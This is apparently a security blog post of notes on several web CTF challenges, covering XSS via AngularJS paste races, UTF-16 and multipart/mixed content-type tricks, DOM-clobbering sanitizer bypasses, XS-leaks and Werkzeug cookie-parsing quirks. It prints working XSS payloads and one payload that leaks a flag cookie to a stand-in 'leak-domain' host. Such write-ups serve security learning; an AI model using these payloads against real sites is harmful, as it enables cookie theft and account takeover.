---
title: A Bunch of Web and XSS Challenges
date: 2023-12-03 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/xss-and-web-challenges/cover-en.png
---

Due to being busy lately, I haven't been participating in CTFs as much in the past two or three months. However, I still come across some interesting challenges on Twitter. Even though I don't have time to solve them, I still take notes because if I don't, I won't be able to solve them later for sure.

This post mainly documents some web front-end related challenges. Since I might not have personally solved them, the content is based on references from others' notes, with some personal insights added.

Keyword list:

1. copy paste XSS
2. connection pool
3. content type UTF16
4. multipart/mixed
5. Chrome DevTools Protocol
6. new headless mode default download
7. Scroll to Text Fragment (STTF)
8. webVTT cue xsleak
9. flask/werkzeug cookie parsing quirks

<!-- more -->

## DOM-based race condition

Source: [https://twitter.com/ryotkak/status/1710291366654181749](https://twitter.com/ryotkak/status/1710291366654181749)

The challenge is quite simple. You are given an editable div with AngularJS enabled, allowing any user interaction to achieve XSS.

``` html
<div contenteditable></div>
<script src="https://angular-no-http3.ryotak.net/angular.min.js"></script>
```

When I first saw the challenge, I guessed it should be related to copy-paste. The solution mentioned that when pasting content into `<div contenteditable></div>`, HTML can be pasted. Although the browser later sanitizes it, it does not target custom attributes.

In other words, if combined with other gadgets, XSS can still be achieved.

For example, the author mentioned this pattern in their article, which executes code due to the presence of AngularJS:

``` html
<html ng-app>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
  <div ng-init="constructor.constructor('alert(1)')()"></div>
</html>
```

However, the problem is that when users paste the payload, AngularJS has already finished loading. If the payload doesn't exist when the loading is complete, it won't be executed. Therefore, the loading time of AngularJS needs to be extended.

In the end, the author used a connection pool to solve this problem. By overwhelming the pool, the loading time of the script can be extended, allowing the payload to be pasted before the loading is complete.

Author's writeup: [https://blog.ryotak.net/post/dom-based-race-condition/](https://blog.ryotak.net/post/dom-based-race-condition/)

## Uncommon Content-Type and UTF16

Source: [https://twitter.com/avlidienbrunn/status/1703805922043220273](https://twitter.com/avlidienbrunn/status/1703805922043220273)

The challenge is as follows:

``` php
<?php
/*
FROM php:7.0-apache

RUN a2dismod status

COPY ./files/index.php /var/www/html
COPY ./files/harder.php /var/www/html
EXPOSE 80

*/
$message = isset($_GET['message']) ? $_GET['message'] : 'hello, world';
$type = isset($_GET['type']) ? $_GET['type'] : die(highlight_file(__FILE__));
header("Content-Type: text/$type");
header("X-Frame-Options: DENY");

if($type == "plain"){
    die("the message is: $message");
}

?>
<html>
<h1>The message is:</h1>
<hr/>
<pre>
    <input type="text" value="<?php echo preg_replace('/([^\s\w!-~]|")/','',$message);?>">
</pre>
<br>
solved by:
<li> nobody yet!</li>
</html>
```

You can control part of the content and part of the content type. How can you achieve XSS?

The first trick is to set the content type to `text/html; charset=UTF-16LE`, which allows the browser to interpret the page as UTF16 and control the output content.

This trick reminds me of the "modernism" challenge in [UIUCTF 2022](https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/).

The second trick is to utilize the feature of the content type header. When the response header is `Content-Type: text/x,image/gif`, because `text/x` is an invalid content type, the browser will prioritize the valid `image/gif`.

In other words, even though the first half of the content type is hardcoded, you can still use this technique to override the complete content type. There is an old content type called `multipart/mixed`, which is like the response version of multipart/form and can output a response like this:

```
HTTP/1.1 200 OK
Content-type: multipart/mixed;boundary="8ormorebytes"


ignored_first_part_before_boundary

--8ormorebytes
Content-Type: text/html

<img src=x onerror=alert(domain)>

--8ormorebytes

ignored_last_part
```

The browser will render the part it understands, and Firefox supports this content type.

This content type could be used to bypass CSP as well. You can refer to this link: [https://twitter.com/ankursundara/status/1723410507389129092](https://twitter.com/ankursundara/status/1723410507389129092)

## Intigriti October 2023 challenge

Challenge: [https://challenge-1023.intigriti.io/](https://challenge-1023.intigriti.io/)

There is an injection point in the backend:

``` html
<title>Intigriti XSS Challenge - <%- title %></title>
```

This title comes from:

``` js
const getTitle = (path) => {
    path = decodeURIComponent(path).split("/");
    path = path.slice(-1).toString();
    return DOMPurify.sanitize(path);
}
```

Although it seems that DOMPurify cannot be bypassed, you can actually close the preceding `<title>` tag by using `<div id="</title><h1>hello</h1>">`, allowing you to inject any tag.

However, the input for this challenge comes from the path, so some `/` characters need to be removed. Here, the `/` is replaced with `&sol;` because `innerHTML` decodes attributes. Finally, the following payload is constructed:

```
/<p id="<%26sol%3Btitle><script>alert()<%26sol%3Bscript>">
```

The goal of this challenge is to read a local file, so XSS is not enough. The next step is to find a way to extend from XSS.

The flag for this challenge has `--disable-web-security`, so SOP is disabled, allowing access to responses from other sources. However, CDP has restrictions on origin and cannot be fully used, but some functionalities are available, such as opening a new webpage.

Since the file is local, only files starting with `file:///` can be read. Therefore, the goal is to find a way to create a file locally.

The solution is to trigger the download feature, which is enabled by default in the new headless mode. Once the download is triggered, the file will be saved to a fixed location. It can then be opened using CDP.

Author's writeup: [https://mizu.re/post/intigriti-october-2023-xss-challenge](https://mizu.re/post/intigriti-october-2023-xss-challenge)

## DOM clobbering

Source: [https://twitter.com/kevin_mizu/status/1697625861543923906](https://twitter.com/kevin_mizu/status/1697625861543923906)

The challenge is a homemade sanitizer:

``` js
class Sanitizer {
    // https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360
    DEFAULT_TAGS  = [ /* ... */ ];

    constructor(config={}) {
        this.version = "2.0.0";
        this.creator = "@kevin_mizu";
        this.ALLOWED_TAGS = config.ALLOWED_TAGS
            ? config.ALLOWED_TAGS.concat([ "html", "head", "body" ]).filter(tag => this.DEFAULT_TAGS.includes(tag))
            : this.DEFAULT_TAGS;
        this.ALLOWED_ATTS = config.ALLOWED_ATTS
            ? config.ALLOWED_ATTS.filter(attr => this.DEFAULT_ATTRS.includes(attr))
            : this.DEFAULT_ATTRS;
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924
    _isClobbered = function (elm) {
        return (
            elm instanceof HTMLFormElement &&
            (typeof elm.nodeName !== 'string' ||
            typeof elm.textContent !== 'string' ||
            typeof elm.removeChild !== 'function' ||
            !(elm.attributes instanceof NamedNodeMap) ||
            typeof elm.removeAttribute !== 'function' ||
            typeof elm.setAttribute !== 'function' ||
            typeof elm.namespaceURI !== 'string' ||
            typeof elm.insertBefore !== 'function' ||
            typeof elm.hasChildNodes !== 'function')
        )
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028
    removeNode = (currentNode) => {
        const parentNode = currentNode.parentNode;
        const childNodes = currentNode.childNodes;

        if (childNodes && parentNode) {
            const childCount = childNodes.length;

            for (let i = childCount - 1; i >= 0; --i) {
                parentNode.insertBefore(
                    childNodes[i].cloneNode(),
                    currentNode.nextSibling
                );
            }
        }

        currentNode.parentElement.removeChild(currentNode);
    }

    sanitize = (input) => {
        let currentNode;
        var dom_tree = new DOMParser().parseFromString(input, "text/html");
        var nodeIterator = document.createNodeIterator(dom_tree);

        while ((currentNode = nodeIterator.nextNode())) {

            // avoid DOMClobbering
            if (this._isClobbered(currentNode) || typeof currentNode.nodeType !== "number") {
                this.removeNode(currentNode);
                continue;
            }

            switch(currentNode.nodeType) {
                case currentNode.ELEMENT_NODE:
                    var tag_name   = currentNode.nodeName.toLowerCase();
                    var attributes = currentNode.attributes;

                    // avoid mXSS
                    if (currentNode.namespaceURI !== "http://www.w3.org/1999/xhtml") {
                        this.removeNode(currentNode);
                        continue;

                    // sanitize tags
                    } else if (!this.ALLOWED_TAGS.includes(tag_name)){
                        this.removeNode(currentNode);
                        continue;
                    }

                    // sanitize attributes
                    for (let i=0; i < attributes.length; i++) {
                        if (!this.ALLOWED_ATTS.includes(attributes[i].name)){
                            this.removeNode(currentNode);
                            continue;
                        }
                    }
            }
        }

        return dom_tree.body.innerHTML;
    }
}
```

It references many other sanitizer libraries, such as DOMPurify.

The key to this challenge is the DOM clobbering of forms, which is usually done like this:

``` html
<form id="test">
    <input name=x>
</form>
```

By placing the element inside a form, `test.x` can be polluted.

However, there is another trick using the `form` attribute to place the element outside:

``` html
<input form=test name=x>
<form id="test"></form>
```

In this challenge, when removing elements, the sanitizer does it like this:

``` js
removeNode = (currentNode) => {
    const parentNode = currentNode.parentNode;
    const childNodes = currentNode.childNodes;

    if (childNodes && parentNode) {
        const childCount = childNodes.length;

        for (let i = childCount - 1; i >= 0; --i) {
            parentNode.insertBefore(
                childNodes[i].cloneNode(),
                currentNode.nextSibling
            );
        }
    }

    currentNode.parentElement.removeChild(currentNode);
}
```

It inserts the nodes under the element to be deleted into the parent's `nextSibling`.

Therefore, if the `nextSibling` is clobbered and the following structure is created:

``` html
<input form=test name=nextSibling> 
<form id=test>
  <input name=nodeName>
  <img src=x onerror=alert(1)>
</form>
```

When removing the `<form>`, all the nodes underneath will be inserted after `<input form=test name=nextSibling>`, bypassing the sanitizer.

This is a really interesting challenge! Although I knew about the `form` attribute, I never thought it could be used in combination with DOM clobbering.

Author's writeup: [https://twitter.com/kevin_mizu/status/1701922141791211776](https://twitter.com/kevin_mizu/status/1701922141791211776)

## LakeCTF 2023 GeoGuessy

The source is referenced from this writeup: [XSS, Race Condition, XS-Leaks and CSP & iframe's sandbox bypass - LakeCTF 2023 GeoGuessy](https://www.xanhacks.xyz/p/lakectf2023-geoguessy/)

Let's start with two interesting unintended issues. The first one is exploiting the feature of cookies not considering the port, allowing the retrieval of cookies using XSS from other challenges. If there is no proper isolation between different challenges, this can happen, as seen in [SekaiCTF 2023 - leakless note](https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/#leakless-note).

The second one is a race condition caused by bad coding practices.

When accessing the page, the user is set as a global variable:

``` js
router.get('/', async (req, res) => {
    user = await db.getUserBy("token", req.cookies?.token)
    if (user) {
         isPremium = user.isPremium
        username = user.username
        return res.render('home',{username, isPremium});
    } else {
        res.render('index');
    }
});
```

Then, when updating the user, a similar pattern is used. After obtaining the user, the data is modified and written:

``` js
router.post('/updateUser', async (req, res) => {
    token = req.cookies["token"]
    if (token) {
        user = await db.getUserBy("token", token)
        if (user) {
            enteredPremiumPin = req.body["premiumPin"]
            if (enteredPremiumPin == premiumPin) {
                user.isPremium = 1
            }
            // ...
            await db.updateUserByToken(token, user)
            return res.status(200).json('yes ok');
        }
    }
    return res.status(401).json('no');
});
```

The admin bot executes the `updateUser` function every time, setting the `isPremium` property of the admin user to 1.

Since the user is a global variable and the database operations are asynchronous, if the execution is fast enough, the `user` inside the `updateUser` function will be a different user, allowing the user to set their own account as a premium account.

The intended solution is to use Scroll to Text Fragment (STTF) to resolve the issue.

## N1CTF - ytiruces

References:

1. [https://dem0dem0.top/2023/10/20/n1ctf2023/](https://dem0dem0.top/2023/10/20/n1ctf2023/)
2. [https://nese.team/posts/n1ctf2023/](https://nese.team/posts/n1ctf2023/)

Using WebVTT, a subtitle display format, in conjunction with the CSS selector `video::cue(v[voice^="n1"])` to perform an XS-Leak attack.

[https://developer.mozilla.org/en-US/docs/Web/CSS/::cue](https://developer.mozilla.org/en-US/docs/Web/CSS/::cue)

It's an interesting selector indeed.

## Werkzeug cookie parsing quirks

Source: [Another HTML Renderer](https://mizu.re/post/another-html-renderer)

This challenge is also from [@kevin_mizu](https://twitter.com/kevin_mizu). We have already introduced two challenges from him before, and this one is another interesting challenge!

In this challenge, there is an admin bot that sets a cookie containing a flag. The goal is to steal this cookie. The core code is as follows:

``` py
@app.route("/render")
def index():
    settings = ""
    try:
        settings = loads(request.cookies.get("settings"))
    except: pass

    if settings:
        res = make_response(render_template("index.html",
            backgroundColor=settings["backgroundColor"] if "backgroundColor" in settings else "#ffde8c",
            textColor=settings["textColor"] if "textColor" in settings else "#000000",
            html=settings["html"] if "html" in settings else ""
        ))
    else:
        res = make_response(render_template("index.html", backgroundColor="#ffde8c", textColor="#000000"))
        res.set_cookie("settings", "{}")

    return res
```

In Python, the page is rendered based on the parameters in the cookie. The template is as follows:

``` html
<iframe
  id="render"
  sandbox=""
  srcdoc="<style>* { text-align: center; }</style>{{html}}"
  width="70%"
  height="500px">
</iframe>
```

Even if you control the HTML, you can only do so within a sandbox iframe, where you cannot execute code and it is not the same origin. In the past, stealing a cookie usually required a same-origin XSS vulnerability.

On the frontend, you can set cookies, but the string "html" is filtered out, so you cannot set the cookie with the string "html":

``` js
const saveSettings = (settings) => {
    document.cookie = `settings=${settings}`;
}

const getSettings = (d) => {
    try {
        s = JSON.parse(d);
        delete s.html;
        return JSON.stringify(s);
    } catch {
        while (d != d.replaceAll("html", "")) {
            d = d.replaceAll("html", "");
        }
        return d;
    }
}

window.onload = () => {
    const params = (new URLSearchParams(window.location.search));
    if (params.get("settings")) {
        window.settings = getSettings(params.get("settings"));
        saveSettings(window.settings);
        renderSettings(window.settings);
    } else {
        window.settings = getCookie("settings");
    }
    window.settings = JSON.parse(window.settings);
```

So how do you solve this challenge? It all comes down to the quirks of Werkzeug's cookie parsing logic.

Let's first talk about how to bypass the check for the string "html". In Werkzeug, if your cookie value is wrapped in `""`, it will be decoded first. Therefore, `"\150tml"` will be decoded as `"html"`, allowing you to bypass the check for the keyword "html".

But after bypassing that, how do you get the flag? This is where the second quirk of Werkzeug's cookie parsing comes into play. When Werkzeug parses a cookie, if it encounters a `"` character, it will parse until the next `"` character.

For example, if the cookie content is like this:

```
Cookie: cookie1="abc; cookie2=def";
```

The result will be: `"cookie1": "abc; cookie2=def"`

In other words, if we sandwich the flag between two cookies, we can include the flag in the HTML, and then find a way to retrieve the cookie. Here is an example payload provided by the author:

```
Cookie: settings="{\"\150tml\": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>\"}"
```

After reading this challenge, I suddenly remembered a similar challenge from DiceCTF 2023, where Jetty had this behavior: [Web - jnotes (6 solves)](https://blog.huli.tw/2023/03/26/en/dicectf-2023-writeup/#web-jnotes-6-solves). It seems that there are quite a few web frameworks with this parsing behavior.
